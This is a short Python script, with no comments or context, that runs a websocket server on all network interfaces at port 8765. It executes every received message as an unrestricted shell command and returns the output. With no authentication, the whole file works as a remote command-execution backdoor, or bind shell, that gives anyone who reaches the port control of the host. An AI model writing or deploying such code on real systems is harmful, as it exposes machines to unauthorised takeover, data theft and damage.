import websockets
import asyncio
import subprocess

async def handler(websocket):
    async for command in websocket:
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        await websocket.send(output.decode())

start_server = websockets.serve(handler, '0.0.0.0', 8765)
asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()
